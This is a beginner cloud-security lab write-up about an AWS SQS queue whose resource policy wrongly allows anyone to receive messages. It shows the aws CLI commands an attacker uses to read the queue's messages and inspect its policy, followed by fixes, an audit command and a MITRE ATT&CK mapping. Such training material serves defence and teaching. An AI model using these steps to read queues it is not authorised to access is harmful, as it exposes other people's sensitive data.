# SQS Queue — Public Resource Policy

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Messaging / Misconfiguration

## Scenario

A developer created an SQS queue for inter-service communication and mistakenly
configured its **resource-based policy** to allow `sqs:ReceiveMessage` from
`"Principal": "*"` — any AWS identity, including unauthenticated callers using
unsigned requests.

Internal messages containing sensitive data are visible to anyone who knows the
queue URL.

## Attack Path

```
[Attacker] No credentials required (queue URL from lab output)
    |
    v
aws sqs receive-message --queue-url <url>  -->  message body
    |
    v
Body  -->  flag
```

### Step 1 — Receive a message (no credentials needed)

```bash
QUEUE_URL="<queue_url>"

aws sqs receive-message \
  --queue-url "${QUEUE_URL}" \
  --region eu-west-1 \
  --query "Messages[0].Body" \
  --output text
```

### Step 2 — List queue attributes to confirm the policy

```bash
aws sqs get-queue-attributes \
  --queue-url "${QUEUE_URL}" \
  --attribute-names Policy \
  --region eu-west-1
```

## How to Fix in Production

1. **Remove `"Principal": "*"` from SQS resource policies** — always scope the
   principal to specific account IDs or role ARNs:
   ```json
   "Principal": {"AWS": "arn:aws:iam::123456789012:role/producer-role"}
   ```
2. **Use IAM identity-based policies** instead of resource-based policies where
   possible — this keeps access control in one place.
3. **Enable SQS server-side encryption** (SSE-SQS or SSE-KMS) — this does not
   protect against a public receive policy, but limits exposure if AWS storage is
   compromised separately.
4. **Audit all SQS queue policies** for public access:
   ```bash
   aws sqs list-queues --query "QueueUrls" --output text | \
     tr '\t' '\n' | xargs -I{} aws sqs get-queue-attributes \
       --queue-url {} --attribute-names Policy | \
       jq 'select(.Attributes.Policy | fromjson | .Statement[].Principal == "*")'
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
